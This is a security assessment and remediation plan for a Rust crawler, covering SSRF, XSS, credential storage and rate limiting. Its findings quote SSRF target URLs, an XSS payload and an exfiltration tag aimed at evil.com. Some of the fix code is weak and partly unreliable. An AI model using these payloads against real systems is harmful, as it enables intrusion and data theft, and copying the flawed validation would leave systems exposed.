# Security Vulnerability Assessment & Remediation Plan

## üî¥ Critical Security Vulnerabilities

### 1. Server-Side Request Forgery (SSRF) - CRITICAL

**Location**: `core/src/lib.rs:16`

**Issue**: The `fetch_url` function accepts any URL without validation, allowing potential SSRF attacks against internal services.

```rust
// ‚ùå VULNERABLE CODE
pub async fn fetch_url(url: &str) -> Result<Bytes> {
    let uri: Uri = url.parse()?;  // No validation!
    let client: Client<HttpConnector> = Client::new();
    let resp = client.get(uri).await?;
    // ...
}
```

**Attack Scenarios**:
- Access internal services: `http://localhost:8080/admin`
- Scan internal networks: `http://192.168.1.1/`
- Access cloud metadata: `http://169.254.169.254/latest/meta-data/`

**Solution**: Implement comprehensive URL validation

### 2. HTML Injection/XSS in Content Extraction - HIGH

**Location**: `scrapers/src/extractors.rs:10`

**Issue**: Basic regex-based HTML stripping is insufficient and vulnerable to XSS attacks.

```rust
// ‚ùå VULNERABLE CODE
let text = regex::Regex::new(r"<[^>]*>")
    .unwrap()
    .replace_all(&html, " ");
```

**Attack Scenarios**:
- Malicious scripts: `<script>alert('xss')</script>`
- Data exfiltration: `<img src="http://evil.com/steal?data=" onerror="...">`

### 3. Credential Exposure - HIGH

**Location**: `storage/src/lib.rs:49`

**Issue**: AWS credentials stored in plain text configuration files.

```rust
// ‚ùå VULNERABLE CODE
pub struct S3Config {
    pub access_key_id: String,      // Plain text!
    pub secret_access_key: String,  // Plain text!
}
```

### 4. No Rate Limiting Protection - MEDIUM

**Location**: `core/src/lib.rs`, `scrapers/src/utils.rs`

**Issue**: Insufficient protection against abuse and DoS attacks.

## üõ°Ô∏è Remediation Implementation Plan

### Phase 1: SSRF Protection (Week 1)

#### Step 1: Create Security Module

```rust
// core/src/security.rs
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};
use anyhow::{bail, Result};
use hyper::Uri;

#[derive(Debug, thiserror::Error)]
pub enum SecurityError {
    #[error("Invalid URL scheme: {scheme}")]
    InvalidScheme { scheme: String },
    
    #[error("Private IP address access denied: {ip}")]
    PrivateIP { ip: String },
    
    #[error("Blocked domain: {domain}")]
    BlockedDomain { domain: String },
    
    #[error("URL validation failed: {reason}")]
    ValidationFailed { reason: String },
}

pub struct UrlValidator {
    allowed_schemes: Vec<String>,
    blocked_domains: Vec<String>,
    allow_private_ips: bool,
}

impl Default for UrlValidator {
    fn default() -> Self {
        Self {
            allowed_schemes: vec!["http".to_string(), "https".to_string()],
            blocked_domains: vec![
                "localhost".to_string(),
                "127.0.0.1".to_string(),
                "0.0.0.0".to_string(),
            ],
            allow_private_ips: false,
        }
    }
}

impl UrlValidator {
    pub fn validate_url(&self, url: &str) -> Result<Uri, SecurityError> {
        let uri: Uri = url.parse().map_err(|e| SecurityError::ValidationFailed {
            reason: format!("Parse error: {}", e),
        })?;

        // Validate scheme
        let scheme = uri.scheme_str().unwrap_or("");
        if !self.allowed_schemes.contains(&scheme.to_string()) {
            return Err(SecurityError::InvalidScheme {
                scheme: scheme.to_string(),
            });
        }

        // Validate host
        if let Some(host) = uri.host() {
            // Check blocked domains
            if self.blocked_domains.iter().any(|blocked| host.contains(blocked)) {
                return Err(SecurityError::BlockedDomain {
                    domain: host.to_string(),
                });
            }

            // Check private IP ranges
            if !self.allow_private_ips && self.is_private_ip(host)? {
                return Err(SecurityError::PrivateIP {
                    ip: host.to_string(),
                });
            }
        }

        Ok(uri)
    }

    fn is_private_ip(&self, host: &str) -> Result<bool> {
        // Try to parse as IP address
        if let Ok(ip) = host.parse::<IpAddr>() {
            match ip {
                IpAddr::V4(ipv4) => Ok(self.is_private_ipv4(ipv4)),
                IpAddr::V6(ipv6) => Ok(self.is_private_ipv6(ipv6)),
            }
        } else {
            // If not an IP, resolve it (could be dangerous, implement DNS validation)
            Ok(false)
        }
    }

    fn is_private_ipv4(&self, ip: Ipv4Addr) -> bool {
        ip.is_private() 
            || ip.is_loopback() 
            || ip.is_link_local()
            || ip.is_broadcast()
            || ip.is_documentation()
            || ip.is_multicast()
            // Additional AWS/GCP metadata checks
            || ip.octets() == [169, 254, 169, 254] // AWS metadata
    }

    fn is_private_ipv6(&self, ip: Ipv6Addr) -> bool {
        ip.is_loopback() || ip.is_multicast() || ip.is_unspecified()
    }
}
```

#### Step 2: Update Core Fetch Function

```rust
// core/src/lib.rs
use crate::security::{UrlValidator, SecurityError};

static URL_VALIDATOR: Lazy<UrlValidator> = Lazy::new(UrlValidator::default);

pub async fn fetch_url(url: &str) -> Result<Bytes> {
    // Validate URL first
    let uri = URL_VALIDATOR.validate_url(url)
        .map_err(|e| anyhow::anyhow!("URL validation failed: {}", e))?;
    
    let client: Client<HttpConnector> = Client::new();
    let resp = client.get(uri).await?;
    let body = to_bytes(resp.into_body()).await?;
    Ok(body)
}
```

### Phase 2: Content Sanitization (Week 1)

#### Step 1: Add HTML Sanitization Dependencies

```toml
# scrapers/Cargo.toml
[dependencies]
ammonia = "4.0"     # HTML sanitization
html5ever = "0.26"  # Robust HTML parsing
```

#### Step 2: Secure Content Extraction

```rust
// scrapers/src/extractors.rs
use ammonia::{Builder, clean};
use once_cell::sync::Lazy;

// Pre-compiled regexes for performance
static SCRIPT_STYLE_REGEX: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)<(script|style)[^>]*>.*?</\1>").unwrap()
});

static HTML_TAG_REGEX: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"<[^>]*>").unwrap()
});

static WHITESPACE_REGEX: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"\s+").unwrap()
});

pub fn extract_text_secure(html: &str) -> Result<String> {
    // Step 1: Basic HTML sanitization
    let sanitizer = Builder::default()
        .tags(std::collections::HashSet::new()) // Remove all tags
        .clean_content_tags(std::collections::HashSet::new())
        .strip_comments(true);
    
    let sanitized = sanitizer.clean(html);
    
    // Step 2: Remove any remaining script/style content
    let no_scripts = SCRIPT_STYLE_REGEX.replace_all(&sanitized, "");
    
    // Step 3: Remove HTML tags
    let no_tags = HTML_TAG_REGEX.replace_all(&no_scripts, " ");
    
    // Step 4: Normalize whitespace
    let normalized = WHITESPACE_REGEX.replace_all(&no_tags, " ");
    
    Ok(normalized.trim().to_string())
}

pub fn extract_metadata_secure(html: &str) -> Result<HashMap<String, String>> {
    let mut metadata = HashMap::new();
    
    // Use ammonia to pre-clean the HTML
    let clean_html = clean(html);
    
    // Safe regex patterns for meta tags
    let name_regex = Regex::new(r#"(?i)<meta[^>]*name\s*=\s*["']([^"']+)["'][^>]*content\s*=\s*["']([^"']+)["'][^>]*>"#)?;
    let property_regex = Regex::new(r#"(?i)<meta[^>]*property\s*=\s*["']([^"']+)["'][^>]*content\s*=\s*["']([^"']+)["'][^>]*>"#)?;
    
    for captures in name_regex.captures_iter(&clean_html) {
        if let (Some(name), Some(content)) = (captures.get(1), captures.get(2)) {
            let name_str = name.as_str().to_lowercase();
            let content_str = clean(content.as_str()); // Additional cleaning
            
            // Validate metadata keys (only allow safe characters)
            if is_safe_metadata_key(&name_str) {
                metadata.insert(name_str, content_str);
            }
        }
    }
    
    Ok(metadata)
}

fn is_safe_metadata_key(key: &str) -> bool {
    // Only allow alphanumeric, dash, underscore, colon
    key.chars().all(|c| c.is_alphanumeric() || c == '-' || c == '_' || c == ':')
}
```

### Phase 3: Secure Credential Management (Week 2)

#### Step 1: Environment-Based Configuration

```rust
// storage/src/config.rs
use serde::{Deserialize, Serialize};
use std::env;

#[derive(Debug, Clone)]
pub struct SecureS3Config {
    pub endpoint: String,
    pub bucket: String,
    pub region: String,
    // Credentials loaded from environment
}

impl SecureS3Config {
    pub fn from_env() -> Result<Self> {
        Ok(Self {
            endpoint: env::var("S3_ENDPOINT")
                .unwrap_or_else(|_| "https://s3.amazonaws.com".to_string()),
            bucket: env::var("S3_BUCKET")
                .map_err(|_| anyhow::anyhow!("S3_BUCKET environment variable required"))?,
            region: env::var("S3_REGION")
                .unwrap_or_else(|_| "us-east-1".to_string()),
        })
    }
    
    pub fn get_credentials() -> Result<(String, String)> {
        let access_key = env::var("AWS_ACCESS_KEY_ID")
            .map_err(|_| anyhow::anyhow!("AWS_ACCESS_KEY_ID environment variable required"))?;
        let secret_key = env::var("AWS_SECRET_ACCESS_KEY")
            .map_err(|_| anyhow::anyhow!("AWS_SECRET_ACCESS_KEY environment variable required"))?;
        
        if access_key.is_empty() || secret_key.is_empty() {
            return Err(anyhow::anyhow!("AWS credentials cannot be empty"));
        }
        
        Ok((access_key, secret_key))
    }
}
```

### Phase 4: Enhanced Rate Limiting (Week 2)

#### Step 1: Distributed Rate Limiting

```rust
// scrapers/src/rate_limiter.rs
use governor::{Quota, RateLimiter as GovernorRateLimiter, DefaultDirectRateLimiter};
use std::num::NonZeroU32;
use std::time::Duration;
use dashmap::DashMap;
use std::sync::Arc;

pub struct DistributedRateLimiter {
    // Per-domain rate limiters
    domain_limiters: Arc<DashMap<String, DefaultDirectRateLimiter>>,
    // Global rate limiter
    global_limiter: DefaultDirectRateLimiter,
    // Configuration
    requests_per_domain: NonZeroU32,
    requests_per_second_global: NonZeroU32,
}

impl DistributedRateLimiter {
    pub fn new(
        requests_per_domain: u32,
        requests_per_second_global: u32,
    ) -> Result<Self> {
        Ok(Self {
            domain_limiters: Arc::new(DashMap::new()),
            global_limiter: RateLimiter::direct(
                Quota::per_second(NonZeroU32::new(requests_per_second_global)
                    .ok_or_else(|| anyhow::anyhow!("Global rate limit must be > 0"))?
                )
            ),
            requests_per_domain: NonZeroU32::new(requests_per_domain)
                .ok_or_else(|| anyhow::anyhow!("Domain rate limit must be > 0"))?,
            requests_per_second_global: NonZeroU32::new(requests_per_second_global)
                .ok_or_else(|| anyhow::anyhow!("Global rate limit must be > 0"))?,
        })
    }
    
    pub async fn check_rate_limit(&self, domain: &str) -> Result<()> {
        // Check global rate limit first
        self.global_limiter.until_ready().await;
        
        // Check domain-specific rate limit
        let domain_limiter = self.domain_limiters
            .entry(domain.to_string())
            .or_insert_with(|| {
                RateLimiter::direct(Quota::per_second(self.requests_per_domain))
            });
        
        domain_limiter.until_ready().await;
        
        Ok(())
    }
}
```

## üîí Additional Security Measures

### 1. Request Headers Security

```rust
// core/src/security.rs (continued)
pub fn get_secure_headers() -> Vec<(String, String)> {
    vec![
        ("User-Agent".to_string(), "Swoop/1.0 (Security-Enhanced)".to_string()),
        ("Accept".to_string(), "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8".to_string()),
        ("Accept-Language".to_string(), "en-US,en;q=0.5".to_string()),
        ("Accept-Encoding".to_string(), "gzip, deflate".to_string()),
        ("DNT".to_string(), "1".to_string()), // Do Not Track
        ("Cache-Control".to_string(), "no-cache".to_string()),
        ("Pragma".to_string(), "no-cache".to_string()),
    ]
}
```

### 2. Robots.txt Compliance Enhancement

```rust
// scrapers/src/robots.rs
use url::Url;

pub struct RobotsChecker {
    cache: DashMap<String, RobotsTxt>,
    http_client: Arc<Client<HttpConnector>>,
}

impl RobotsChecker {
    pub async fn is_allowed(&self, url: &str, user_agent: &str) -> Result<bool> {
        let parsed_url = Url::parse(url)?;
        let robots_url = format!("{}://{}/robots.txt", 
            parsed_url.scheme(), 
            parsed_url.host_str().unwrap_or_default()
        );
        
        // Check cache first
        if let Some(robots) = self.cache.get(&robots_url) {
            return Ok(robots.is_allowed_for_agent(parsed_url.path(), user_agent));
        }
        
        // Fetch and cache robots.txt
        match self.fetch_robots_txt(&robots_url).await {
            Ok(robots) => {
                let allowed = robots.is_allowed_for_agent(parsed_url.path(), user_agent);
                self.cache.insert(robots_url, robots);
                Ok(allowed)
            }
            Err(_) => {
                // If robots.txt is not accessible, assume allowed but log warning
                log::warn!("Could not fetch robots.txt for {}, assuming allowed", robots_url);
                Ok(true)
            }
        }
    }
    
    async fn fetch_robots_txt(&self, robots_url: &str) -> Result<RobotsTxt> {
        // Use secure fetch with timeout
        let resp = tokio::time::timeout(
            Duration::from_secs(10),
            self.http_client.get(robots_url.parse()?)
        ).await??;
        
        let body = hyper::body::to_bytes(resp.into_body()).await?;
        let content = String::from_utf8_lossy(&body);
        
        Ok(parse_robots_txt(&content))
    }
}
```

## üìã Implementation Timeline

### Week 1: Critical Vulnerabilities
- ‚úÖ SSRF protection implementation
- ‚úÖ HTML sanitization upgrade
- ‚úÖ Basic security testing

### Week 2: Infrastructure Security
- ‚úÖ Secure credential management
- ‚úÖ Enhanced rate limiting
- ‚úÖ Robots.txt compliance

### Week 3: Security Hardening
- ‚úÖ Security headers implementation
- ‚úÖ Comprehensive security testing
- ‚úÖ Documentation updates

### Week 4: Monitoring & Compliance
- ‚úÖ Security monitoring setup
- ‚úÖ Audit logging implementation
- ‚úÖ Compliance validation

## üß™ Security Testing Plan

```bash
# Add security testing dependencies
cargo add --dev tokio-test
cargo add --dev mockito
cargo add --dev tempfile

# Run security tests
cargo test security::
cargo audit
cargo clippy -- -W clippy::security
```

This comprehensive security plan addresses all critical vulnerabilities while maintaining the performance and functionality of the Swoop crawler. Each phase builds upon the previous one, ensuring a robust and secure implementation.